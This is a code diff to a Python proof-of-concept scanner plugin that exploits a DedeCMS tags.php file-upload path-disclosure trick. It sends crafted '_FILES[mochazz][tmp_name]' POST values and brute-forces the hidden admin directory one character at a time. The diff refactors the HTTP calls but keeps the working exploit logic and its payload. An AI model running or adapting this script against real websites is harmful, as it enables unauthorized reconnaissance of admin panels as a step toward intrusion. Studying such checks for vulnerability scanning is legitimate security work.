@@ -6,10 +6,7 @@ __author__ = 'orleven'
     https://xz.aliyun.com/t/2064 find manage
 """
 
-import urllib.parse
-import requests
 import itertools
-requests.packages.urllib3.disable_warnings()
 
 def get_script_info(data=None):
     script_info = {
@@ -37,21 +34,15 @@ def prove(data):
             url = data['base_url'] + a + 'tags.php'
             back_dir = ""
             flag = 0
-            try:
-                res = requests.get(url, headers=data['headers'], timeout=data['timeout'])
-            except Exception as e:
-                res = None
+            res = curl('get', url)
             if res!=None and res.status_code ==200:
                 for num in range(1, 7):
-                    if flag:
+                    if flag ==1 :
                         break
                     for pre in itertools.permutations(characters, num):
                         pre = ''.join(list(pre))
                         _data["_FILES[mochazz][tmp_name]"] = _data["_FILES[mochazz][tmp_name]"].format(p=pre)
-                        try:
-                            r = requests.post(url, data=_data, headers=data['headers'], timeout=data['timeout'])
-                        except:
-                            r= None
+                        r = curl('post', url, data=_data)
                         if r!=None:
                             if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                                 flag = 1
@@ -63,7 +54,7 @@ def prove(data):
                 flag = 0
                 x = 0
                 for i in range(30):
-                    if flag:
+                    if flag == 1:
                         x = i
                         break
                     for ch in characters:
@@ -72,10 +63,7 @@ def prove(data):
                             x = i
                             break
                         _data["_FILES[mochazz][tmp_name]"] = _data["_FILES[mochazz][tmp_name]"].format(p=back_dir + ch)
-                        try:
-                            r = requests.post(url, data=_data, headers=data['headers'], timeout=data['timeout'])
-                        except:
-                            r= None
+                        r = curl('post', url, data=_data)
                         if r != None:
                             if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                                 back_dir += ch
@@ -84,7 +72,8 @@ def prove(data):
                             else:
                                 _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
 
-                if x < 29:
+                if x < 29 and flag ==1:
+
                     data['flag'] = 1
                     data['data'].append({"url": back_dir})
                     data['res'].append({"info": back_dir, "key": 'dede_manage'})
